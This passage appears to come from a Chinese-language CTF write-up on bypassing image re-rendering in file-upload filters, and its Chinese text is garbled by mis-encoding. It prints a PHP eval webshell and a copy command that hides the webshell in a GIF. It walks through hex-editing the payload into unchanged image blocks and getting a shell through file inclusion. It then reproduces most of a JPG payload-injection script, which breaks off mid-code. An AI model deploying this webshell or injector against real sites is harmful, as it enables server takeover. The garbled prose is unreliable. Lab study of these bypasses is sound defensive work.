src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2013.38.41.png" style="zoom:50%;"><ul><li>æµ‹è¯•èƒ½å¦æ­£å¸¸ä¸Šä¼ </li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2013.40.10.png" style="zoom:30%;"><p>å¯ä»¥æˆåŠŸä¸Šä¼ ã€‚</p><ul><li>å‡†å¤‡ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼šyjh.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>åœ¨windowsä¸­åˆ¶ä½œæœ¨é©¬</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">copy hacker-hacking.gif /b + yjh.php /a muma.gif<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2013.50.13.png" style="zoom:50%;"><ul><li>010editoræŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸ</li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2013.51.54.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°å°¾éƒ¨è¿½åŠ äº†ä¸€å¥è¯æœ¨é©¬ã€‚</p><h2 id="3-2-åˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¿›è¡Œäº†äºŒæ¬¡å¤„ç†ï¼Ÿ"><a href="#3-2-åˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¿›è¡Œäº†äºŒæ¬¡å¤„ç†ï¼Ÿ" class="headerlink" title="3.2 åˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¿›è¡Œäº†äºŒæ¬¡å¤„ç†ï¼Ÿ"></a>3.2 åˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¿›è¡Œäº†äºŒæ¬¡å¤„ç†ï¼Ÿ</h2><blockquote><p>å¯¹æ¯”åŸå§‹å›¾ç‰‡ä¸ä¸Šä¼ åçš„å›¾ç‰‡å¤§å°ï¼Œæˆ–ç¼–è¾‘å™¨æ‰“å¼€å›¾ç‰‡æŸ¥çœ‹ä¸Šä¼ åä¿ç•™äº†å“ªäº›æ•°æ®ã€‚</p></blockquote><p>å…ˆä¸Šä¼ <code>muma.gif</code>å¹¶è®¿é—®ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.03.50.png" style="zoom:50%;"><p>å¦å­˜ä¸º<code>muma_processed.gif</code></p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.05.23.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°ç»“å°¾å¤„çš„æœ¨é©¬ä»£ç å·²ç»æ²¡äº†ï¼Œæ˜¾ç„¶æ˜¯ç»è¿‡äº†åŠ å·¥ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.06.21.png" style="zoom:50%;"><p>ä½¿ç”¨010editoræ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å·®å¼‚ï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.07.44.png" style="zoom:50%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.08.26.png" style="zoom:50%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.16.36.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶æ˜¯ç»è¿‡äºŒæ¬¡å¤„ç†çš„ï¼Œå¾ˆå¤šåœ°æ–¹éƒ½ä¸ç›¸åŒï¼Œä½†ä¹Ÿå­˜åœ¨ä¸€äº›ç›¸åŒçš„å†…å®¹ã€‚</p><h2 id="3-3-åœ¨ä¸å˜çš„æ•°æ®å—ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬"><a href="#3-3-åœ¨ä¸å˜çš„æ•°æ®å—ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="3.3 åœ¨ä¸å˜çš„æ•°æ®å—ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬"></a>3.3 åœ¨ä¸å˜çš„æ•°æ®å—ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬</h2><p>åœ¨compareé¢æ¿ä¸­å°½é‡æ‰¾åœ°å€ç›¸åŒä¸”å¤§å°ï¼ˆsizeï¼‰ç›¸åŒçš„å—ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.17.21.png" style="zoom:50%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.16.36.png" style="zoom:50%;"><p>æˆ‘ä»¬å°±å¯ä»¥åœ¨æ²¡æœ‰æ”¹å˜çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯è“è‰²éƒ¨åˆ†ï¼Œæ’å…¥æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.22.10.png" style="zoom:50%;"><p>å¯ä»¥åœ¨è¿™ä¸ªç›¸åŒæ•°æ®çš„åŒºåŸŸå†…ï¼Œç›´æ¥ç¼–è¾‘å³ä¾§çš„asciiå­—ç¬¦ï¼Œä¼šè¦†ç›–å¡«å……ã€‚</p><p>å¦å­˜ä¸º<code>muma_php_sxk.gif</code>ï¼Œé‡æ–°ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.25.08.png" style="zoom:50%;"><p>è®¿é—®ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶å¹¶å¦å­˜ä¸º<code>muma_php_sxk_processed.gif</code></p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.28.06.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°ä¸€å¥è¯æœ¨é©¬è¿˜åœ¨ï¼Œè¯´æ˜æˆ‘ä»¬çš„æœ¨é©¬æˆåŠŸç»•è¿‡äº†äºŒæ¬¡æ¸²æŸ“çš„ç ´åã€‚æ¥ä¸‹æ¥å°±å¯ä»¥å°è¯•getshelläº†ã€‚</p><h2 id="3-4-getshell"><a href="#3-4-getshell" class="headerlink" title="3.4 getshell"></a>3.4 getshell</h2><p>è®¿é—®ä¸Šä¼ çš„<code>muma_php_sxk.gif</code>æ–‡ä»¶ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.31.50.png" style="zoom:40%;"><p>è®¿é—®æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.33.45.png" alt="æ–‡ä»¶åŒ…å«æ¼æ´" style="zoom:50%;"><p>åŒ…å«æœ¨é©¬æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨èšå‰‘getshellã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.30.55.png" alt="æˆåŠŸgetshell" style="zoom:50%;"><p>æˆåŠŸgetshellè·å–åˆ°flagã€‚</p><p>flagï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-24%2016.32.19.png" style="zoom:50%;"><h1 id="å››ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«jpgå›¾ç‰‡æœ¨é©¬ï¼ˆæœªæˆåŠŸï¼‰"><a href="#å››ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«jpgå›¾ç‰‡æœ¨é©¬ï¼ˆæœªæˆåŠŸï¼‰" class="headerlink" title="å››ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«jpgå›¾ç‰‡æœ¨é©¬ï¼ˆæœªæˆåŠŸï¼‰"></a>å››ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«jpgå›¾ç‰‡æœ¨é©¬ï¼ˆæœªæˆåŠŸï¼‰</h1><h2 id="4-1-æœ¨é©¬ç”Ÿæˆè„šæœ¬"><a href="#4-1-æœ¨é©¬ç”Ÿæˆè„šæœ¬" class="headerlink" title="4.1 æœ¨é©¬ç”Ÿæˆè„šæœ¬"></a>4.1 æœ¨é©¬ç”Ÿæˆè„šæœ¬</h2><p>åˆ›å»ºä¸€ä¸ªphpè„šæœ¬ç”¨æ¥åˆ¶ä½œå›¾ç‰‡æœ¨é©¬ï¼Œæˆ‘è¿™é‡Œå«<code>generate_jpg_muma.php</code>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg&gt;    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=phpinfo();?&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-&gt;</span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token 